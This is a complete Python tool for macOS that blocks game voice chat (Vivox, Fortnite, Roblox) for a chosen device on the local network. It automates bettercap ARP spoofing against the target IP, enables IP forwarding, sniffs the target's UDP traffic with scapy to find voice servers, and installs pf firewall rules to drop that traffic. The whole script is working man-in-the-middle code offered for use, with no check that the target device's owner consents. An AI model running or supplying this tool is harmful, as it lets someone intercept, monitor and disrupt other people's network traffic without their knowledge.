#!/usr/bin/env python3
"""
GAME VOICE BLOCKER - All-in-One Edition
========================================
Blocks voice chat for Fortnite, Roblox, and other Vivox-based games.

Features:
- Automatic bettercap ARP spoofing management
- Recon to discover voice servers
- Detects new IPs not in existing rules
- Comprehensive port + IP blocking
- Live monitoring mode

Usage:
  sudo python3 voice_blocker_complete.py --target 10.0.0.47
  sudo python3 voice_blocker_complete.py --target 10.0.0.47 --monitor
  sudo python3 voice_blocker_complete.py --disable
  sudo python3 voice_blocker_complete.py --status
"""

import argparse
import subprocess
import sys
import os
import time
import signal
import json
import re
import threading
from datetime import datetime
from collections import defaultdict
from pathlib import Path

try:
    from scapy.all import sniff, IP, UDP, conf
    conf.verb = 0
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] Scapy not installed. Recon disabled. Install: pip install scapy")

# ==================== CONFIGURATION ====================

# Known Vivox IP ranges (voice servers)
VIVOX_IP_RANGES = [
    "128.116.0.0/16",    # Primary Vivox range (covers all 128.116.x.x)
]

# Additional known voice server ranges (discovered over time)
KNOWN_VOICE_RANGES = [
    "64.79.208.0/22",    # Vivox legacy
    "66.152.160.0/20",   # Vivox legacy
    "35.186.224.0/20",   # Google Cloud (Epic voice)
]

# Voice signaling ports (safe to block universally)
VOICE_SIGNAL_PORTS = [
    "3478:3479",         # STUN/TURN
    "5060",              # SIP
    "5062",              # SIP alternate
    "6250",              # Vivox specific
    "19302",             # Google STUN
]

# Voice media port range (safe to block)
VOICE_MEDIA_PORTS = "12000:32000"

# DO NOT BLOCK: 49152-65535 (breaks gameplay)

# State/config files
STATE_FILE = Path.home() / ".voice_blocker_state.json"
PF_ANCHOR = "voice_blocker"

# ==================== COLORS ====================

class C:
    R = '\033[91m'   # Red
    G = '\033[92m'   # Green
    Y = '\033[93m'   # Yellow
    B = '\033[94m'   # Blue
    P = '\033[95m'   # Purple
    C = '\033[96m'   # Cyan
    W = '\033[97m'   # White
    BOLD = '\033[1m'
    END = '\033[0m'

def log(msg, color=C.W):
    print(f"{color}{msg}{C.END}")

def banner():
    print(f"""{C.C}{C.BOLD}
╔══════════════════════════════════════════════════════════════════════╗
║             GAME VOICE BLOCKER - All-in-One Edition                  ║
║                                                                      ║
║  Blocks: Fortnite, Roblox, Discord, and Vivox-based voice chat      ║
╚══════════════════════════════════════════════════════════════════════╝
{C.END}""")

# ==================== STATE MANAGEMENT ====================

def load_state():
    if STATE_FILE.exists():
        try:
            with open(STATE_FILE) as f:
                return json.load(f)
        except:
            pass
    return {
        "discovered_ips": [],
        "blocked_ranges": [],
        "last_run": None,
        "target": None
    }

def save_state(state):
    state["last_run"] = datetime.now().isoformat()
    with open(STATE_FILE, 'w') as f:
        json.dump(state, f, indent=2)

# ==================== BETTERCAP MANAGEMENT ====================

def is_bettercap_running():
    result = subprocess.run(["pgrep", "-x", "bettercap"], capture_output=True)
    return result.returncode == 0

def start_bettercap(interface, target, gateway):
    """Start bettercap in background with ARP spoofing"""
    log(f"[*] Starting bettercap ARP spoof...", C.Y)
    
    # Create a caplet for bettercap
    caplet_content = f"""
set arp.spoof.fullduplex true
set arp.spoof.targets {target}
arp.spoof on
"""
    caplet_path = "/tmp/voice_blocker.cap"
    with open(caplet_path, 'w') as f:
        f.write(caplet_content)
    
    # Start bettercap in background
    try:
        process = subprocess.Popen(
            ["bettercap", "-iface", interface, "-caplet", caplet_path, "-silent"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(3)  # Wait for bettercap to start
        
        if process.poll() is None:
            log(f"[+] Bettercap started (PID: {process.pid})", C.G)
            return process
        else:
            log(f"[-] Bettercap failed to start", C.R)
            return None
    except FileNotFoundError:
        log(f"[-] Bettercap not found. Install: brew install bettercap", C.R)
        return None

def stop_bettercap():
    """Stop any running bettercap processes"""
    subprocess.run(["pkill", "-x", "bettercap"], capture_output=True)
    log("[*] Bettercap stopped", C.Y)

def get_gateway():
    """Auto-detect default gateway"""
    try:
        result = subprocess.run(
            ["netstat", "-nr"], capture_output=True, text=True
        )
        for line in result.stdout.split('\n'):
            if 'default' in line:
                parts = line.split()
                if len(parts) >= 2:
                    return parts[1]
    except:
        pass
    return None

def get_interface():
    """Get primary network interface"""
    try:
        result = subprocess.run(
            ["route", "-n", "get", "default"], capture_output=True, text=True
        )
        for line in result.stdout.split('\n'):
            if 'interface:' in line:
                return line.split(':')[1].strip()
    except:
        pass
    return "en0"

# ==================== PF FIREWALL ====================

def pf_enabled():
    result = subprocess.run(["pfctl", "-si"], capture_output=True, text=True)
    return "Status: Enabled" in result.stdout

def pf_enable():
    subprocess.run(["pfctl", "-e"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def pf_get_rules():
    result = subprocess.run(
        ["pfctl", "-a", PF_ANCHOR, "-sr"],
        capture_output=True, text=True
    )
    return result.stdout.strip()

def pf_get_blocked_ips():
    """Extract currently blocked IPs/ranges from pf rules"""
    rules = pf_get_rules()
    ips = set()
    for line in rules.split('\n'):
        # Match IP addresses and CIDR ranges
        matches = re.findall(r'(\d+\.\d+\.\d+\.\d+(?:/\d+)?)', line)
        for m in matches:
            if not m.startswith('10.') and not m.startswith('192.168.'):
                ips.add(m)
    return ips

def pf_apply_rules(target, extra_ips=None):
    """Apply comprehensive voice blocking rules"""
    rules = []
    
    # Header
    rules.append(f"# Voice Blocker Rules - Generated {datetime.now()}")
    rules.append(f"# Target: {target}")
    rules.append("")
    
    # Block Vivox IP ranges
    rules.append("# Vivox IP Ranges")
    for ip_range in VIVOX_IP_RANGES + KNOWN_VOICE_RANGES:
        rules.append(f"block drop quick proto udp from {target} to {ip_range}")
        rules.append(f"block drop quick proto udp from {ip_range} to {target}")
    
    # Block extra discovered IPs
    if extra_ips:
        rules.append("")
        rules.append("# Discovered Voice Server IPs")
        for ip in extra_ips:
            # Convert to /24 subnet for broader blocking
            parts = ip.split('.')
            subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
            rules.append(f"block drop quick proto udp from {target} to {subnet}")
            rules.append(f"block drop quick proto udp from {subnet} to {target}")
    
    # Block voice signaling ports
    rules.append("")
    rules.append("# Voice Signaling Ports")
    for port in VOICE_SIGNAL_PORTS:
        rules.append(f"block drop quick proto udp from {target} to any port {port}")
    
    # Block voice media port range
    rules.append("")
    rules.append("# Voice Media Ports (12000-32000)")
    rules.append(f"block drop quick proto udp from {target} to any port {VOICE_MEDIA_PORTS}")
    
    rules_text = "\n".join(rules)
    
    # Write to temp file
    tmp_file = "/tmp/voice_blocker_rules.conf"
    with open(tmp_file, 'w') as f:
        f.write(rules_text + "\n")
    
    # Apply rules
    pf_enable()
    result = subprocess.run(
        f"pfctl -a {PF_ANCHOR} -f {tmp_file}",
        shell=True, capture_output=True, text=True
    )
    
    if result.returncode == 0:
        return True, rules_text
    else:
        # Try alternate method
        result = subprocess.run(
            f'echo "{rules_text}" | pfctl -a {PF_ANCHOR} -f -',
            shell=True, capture_output=True, text=True
        )
        return result.returncode == 0, rules_text

def pf_clear_rules():
    subprocess.run(
        ["pfctl", "-a", PF_ANCHOR, "-F", "all"],
        capture_output=True
    )

def pf_get_stats():
    """Get blocking statistics"""
    result = subprocess.run(
        ["pfctl", "-a", PF_ANCHOR, "-si"],
        capture_output=True, text=True
    )
    stats = {"match": 0, "match_rate": "0.0/s"}
    for line in result.stdout.split('\n'):
        if 'match' in line and 'mismatch' not in line:
            parts = line.split()
            if len(parts) >= 2:
                try:
                    stats["match"] = int(parts[1])
                    if len(parts) >= 3:
                        stats["match_rate"] = parts[2]
                except:
                    pass
    return stats

# ==================== TRAFFIC ANALYSIS ====================

class VoiceRecon:
    def __init__(self, interface, target):
        self.interface = interface
        self.target = target
        self.connections = defaultdict(lambda: {
            'packets': 0, 'bytes': 0, 'ports': set(),
            'is_voice': False, 'confidence': 0, 'reasons': []
        })
        self.running = False
    
    def analyze(self, pkt):
        if not pkt.haslayer(IP):
            return
        
        src = pkt[IP].src
        dst = pkt[IP].dst
        
        if src != self.target and dst != self.target:
            return
        
        remote = dst if src == self.target else src
        
        # Skip local
        if remote.startswith(('10.', '192.168.', '172.', '224.', '239.')):
            return
        
        conn = self.connections[remote]
        conn['packets'] += 1
        conn['bytes'] += len(pkt)
        
        if pkt.haslayer(UDP):
            port = pkt[UDP].dport if src == self.target else pkt[UDP].sport
            conn['ports'].add(port)
            
            # Voice indicators
            if port in [3478, 3479, 19302]:
                if 'STUN' not in conn['reasons']:
                    conn['reasons'].append('STUN')
                    conn['confidence'] += 40
                    conn['is_voice'] = True
            
            if 5060 <= port <= 5062:
                if 'SIP' not in conn['reasons']:
                    conn['reasons'].append('SIP')
                    conn['confidence'] += 35
                    conn['is_voice'] = True
            
            if 12000 <= port <= 32000:
                if 'Vivox ports' not in conn['reasons']:
                    conn['reasons'].append('Vivox ports')
                    conn['confidence'] += 30
            
            # Packet pattern analysis
            pkt_size = len(pkt)
            if 40 <= pkt_size <= 300 and conn['packets'] > 20:
                if 'Voice pattern' not in conn['reasons']:
                    conn['reasons'].append('Voice pattern')
                    conn['confidence'] += 20
            
            if conn['packets'] > 100:
                if 'High rate' not in conn['reasons']:
                    conn['reasons'].append('High rate')
                    conn['confidence'] += 15
            
            if conn['confidence'] >= 40:
                conn['is_voice'] = True
    
    def get_voice_servers(self):
        return [
            {'ip': ip, **data}
            for ip, data in self.connections.items()
            if data['is_voice'] or data['confidence'] >= 40
        ]
    
    def run(self, duration=30):
        if not SCAPY_AVAILABLE:
            log("[-] Scapy not available, skipping recon", C.R)
            return []
        
        self.running = True
        log(f"[*] Running recon for {duration}s - make sure voice chat is ACTIVE", C.Y)
        
        try:
            sniff(
                iface=self.interface,
                prn=self.analyze,
                filter=f"host {self.target} and udp",
                store=False,
                timeout=duration,
                stop_filter=lambda x: not self.running
            )
        except Exception as e:
            log(f"[-] Recon error: {e}", C.R)
        
        return self.get_voice_servers()

# ==================== MONITORING ====================

def monitor_loop(target):
    """Live monitoring of blocked packets"""
    log(f"\n[*] Monitoring blocked packets (Ctrl+C to stop)\n", C.C)
    
    last_match = 0
    try:
        while True:
            stats = pf_get_stats()
            current = stats['match']
            diff = current - last_match
            last_match = current
            
            timestamp = datetime.now().strftime('%H:%M:%S')
            
            if diff > 0:
                log(f"  {timestamp}  Blocked: {current:,} total (+{diff} new)  Rate: {stats['match_rate']}", C.R)
            else:
                print(f"  {timestamp}  Blocked: {current:,} total  Rate: {stats['match_rate']}", end='\r')
            
            time.sleep(1)
    except KeyboardInterrupt:
        print()
        log("[*] Monitoring stopped", C.Y)

# ==================== MAIN WORKFLOW ====================

def run_full_block(target, interface=None, gateway=None, recon_duration=30, monitor=False):
    """Main workflow: bettercap -> recon -> block -> monitor"""
    
    banner()
    
    # Auto-detect network config
    if not interface:
        interface = get_interface()
    if not gateway:
        gateway = get_gateway()
    
    log(f"  Target:    {C.G}{target}{C.END}")
    log(f"  Interface: {C.G}{interface}{C.END}")
    log(f"  Gateway:   {C.G}{gateway}{C.END}")
    print()
    
    state = load_state()
    bettercap_proc = None
    
    try:
        # Step 1: Enable IP forwarding
        log("[1/5] Enabling IP forwarding...", C.B)
        subprocess.run(
            ["sysctl", "-w", "net.inet.ip.forwarding=1"],
            capture_output=True
        )
        log("      Done", C.G)
        
        # Step 2: Start bettercap if not running
        log("[2/5] Setting up ARP spoofing...", C.B)
        if is_bettercap_running():
            log("      Bettercap already running", C.G)
        else:
            bettercap_proc = start_bettercap(interface, target, gateway)
            if not bettercap_proc:
                log("[-] Failed to start bettercap. Start manually:", C.R)
                log(f"    sudo bettercap -iface {interface}", C.Y)
                log(f"    set arp.spoof.fullduplex true", C.Y)
                log(f"    set arp.spoof.targets {target}", C.Y)
                log(f"    arp.spoof on", C.Y)
                input(f"\n{C.Y}Press Enter when bettercap is running...{C.END}")
        
        # Step 3: Get existing blocked IPs
        log("[3/5] Checking existing rules...", C.B)
        existing_ips = pf_get_blocked_ips()
        log(f"      {len(existing_ips)} IPs/ranges currently blocked", C.G)
        
        # Step 4: Run recon
        log(f"[4/5] Running voice server recon ({recon_duration}s)...", C.B)
        log(f"      {C.Y}>>> Make sure voice chat is ACTIVE on target! <<<{C.END}", C.Y)
        print()
        
        recon = VoiceRecon(interface, target)
        voice_servers = recon.run(recon_duration)
        
        # Check for new IPs
        new_ips = []
        if voice_servers:
            print()
            log(f"      Found {len(voice_servers)} voice server(s):", C.G)
            for server in voice_servers:
                ip = server['ip']
                reasons = ', '.join(server['reasons'])
                
                # Check if already blocked
                is_new = not any(ip.startswith(blocked.split('/')[0].rsplit('.', 1)[0]) 
                                for blocked in existing_ips)
                
                if is_new:
                    new_ips.append(ip)
                    log(f"        {C.R}NEW:{C.END} {ip} ({reasons})", C.R)
                else:
                    log(f"        {ip} ({reasons}) - already covered", C.W)
        else:
            log("      No voice servers found (is voice chat active?)", C.Y)
        
        # Step 5: Apply blocking rules
        log("[5/5] Applying firewall rules...", C.B)
        
        success, rules_text = pf_apply_rules(target, new_ips)
        
        if success:
            log("      Rules applied successfully!", C.G)
            
            # Show summary
            print()
            log("=" * 60, C.C)
            log(" BLOCKING ACTIVE", C.G)
            log("=" * 60, C.C)
            print()
            log(f" Target: {target}", C.W)
            log(f" Blocked IP ranges: {len(VIVOX_IP_RANGES) + len(KNOWN_VOICE_RANGES) + len(new_ips)}", C.W)
            log(f" Blocked ports: 3478-3479, 5060, 5062, 6250, 12000-32000", C.W)
            print()
            
            # Save state
            state['target'] = target
            state['discovered_ips'] = list(set(state.get('discovered_ips', []) + new_ips))
            save_state(state)
            
            # Start monitoring if requested
            if monitor:
                monitor_loop(target)
            else:
                log(f" Run with --monitor to see blocked packets live", C.Y)
                log(f" Run with --disable to remove blocks", C.Y)
                log(f" Run with --status to check current state", C.Y)
        else:
            log("      Failed to apply rules automatically", C.R)
            log("      Apply manually:", C.Y)
            print()
            print(f"sudo pfctl -a {PF_ANCHOR} -f - << 'EOF'")
            print(rules_text)
            print("EOF")
    
    except KeyboardInterrupt:
        print()
        log("[!] Interrupted", C.Y)
    
    finally:
        # Don't stop bettercap - it needs to keep running
        if bettercap_proc:
            log(f"[*] Bettercap running in background (PID: {bettercap_proc.pid})", C.Y)
            log(f"    Stop with: sudo pkill bettercap", C.Y)

def show_status():
    """Show current blocking status"""
    banner()
    
    state = load_state()
    
    # PF status
    if pf_enabled():
        log("[+] pf firewall: ENABLED", C.G)
    else:
        log("[-] pf firewall: DISABLED", C.R)
    
    # Bettercap status
    if is_bettercap_running():
        log("[+] Bettercap: RUNNING", C.G)
    else:
        log("[-] Bettercap: NOT RUNNING (blocking won't work!)", C.R)
    
    # Rules
    rules = pf_get_rules()
    if rules:
        print()
        log("Active rules:", C.C)
        for line in rules.split('\n')[:15]:
            print(f"  {line}")
        if len(rules.split('\n')) > 15:
            print(f"  ... and {len(rules.split(chr(10))) - 15} more")
    else:
        log("[-] No blocking rules active", C.Y)
    
    # Stats
    stats = pf_get_stats()
    print()
    log(f"Packets blocked: {stats['match']:,} (rate: {stats['match_rate']})", C.C)
    
    # State
    if state.get('target'):
        print()
        log(f"Last target: {state['target']}", C.W)
        log(f"Last run: {state.get('last_run', 'Never')}", C.W)
        if state.get('discovered_ips'):
            log(f"Discovered IPs: {', '.join(state['discovered_ips'][:5])}", C.W)

def disable_blocking():
    """Disable all blocking"""
    banner()
    
    log("[*] Disabling voice blocking...", C.Y)
    
    # Clear pf rules
    pf_clear_rules()
    log("[+] Firewall rules cleared", C.G)
    
    # Stop bettercap
    if is_bettercap_running():
        stop_bettercap()
        log("[+] Bettercap stopped", C.G)
    
    # Clear state
    state = load_state()
    state['target'] = None
    save_state(state)
    
    log("\n[+] Voice blocking disabled!", C.G)

# ==================== CLI ====================

def main():
    parser = argparse.ArgumentParser(
        description="Game Voice Blocker - Block voice chat while allowing gameplay",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 voice_blocker_complete.py --target 10.0.0.47
  sudo python3 voice_blocker_complete.py --target 10.0.0.47 --monitor
  sudo python3 voice_blocker_complete.py --target 10.0.0.47 --duration 60
  sudo python3 voice_blocker_complete.py --status
  sudo python3 voice_blocker_complete.py --disable

The script will:
  1. Start bettercap for ARP spoofing (if not running)
  2. Run recon to find voice servers
  3. Check for new IPs not already blocked
  4. Apply comprehensive blocking rules
  5. Optionally monitor blocked packets
        """
    )
    
    parser.add_argument("-t", "--target", help="Target device IP to block voice for")
    parser.add_argument("-i", "--interface", help="Network interface (auto-detected)")
    parser.add_argument("-g", "--gateway", help="Gateway IP (auto-detected)")
    parser.add_argument("-d", "--duration", type=int, default=30,
                        help="Recon duration in seconds (default: 30)")
    parser.add_argument("--monitor", action="store_true",
                        help="Show live blocked packet count")
    parser.add_argument("--status", action="store_true",
                        help="Show current blocking status")
    parser.add_argument("--disable", action="store_true",
                        help="Disable all blocking and stop bettercap")
    parser.add_argument("--no-recon", action="store_true",
                        help="Skip recon, just apply known blocks")
    
    args = parser.parse_args()
    
    # Check root
    if os.geteuid() != 0:
        log("[-] Root required. Run with: sudo python3 voice_blocker_complete.py ...", C.R)
        sys.exit(1)
    
    # Handle modes
    if args.status:
        show_status()
    elif args.disable:
        disable_blocking()
    elif args.target:
        run_full_block(
            target=args.target,
            interface=args.interface,
            gateway=args.gateway,
            recon_duration=0 if args.no_recon else args.duration,
            monitor=args.monitor
        )
    else:
        # Check if we have a previous target
        state = load_state()
        if state.get('target'):
            log(f"[*] Previous target: {state['target']}", C.Y)
            use_prev = input(f"Use this target? (Y/n): ").strip().lower()
            if use_prev != 'n':
                run_full_block(
                    target=state['target'],
                    interface=args.interface,
                    gateway=args.gateway,
                    recon_duration=0 if args.no_recon else args.duration,
                    monitor=args.monitor
                )
                return
        
        parser.print_help()
        print()
        log("[-] --target is required", C.R)
        sys.exit(1)

if __name__ == "__main__":
    main()
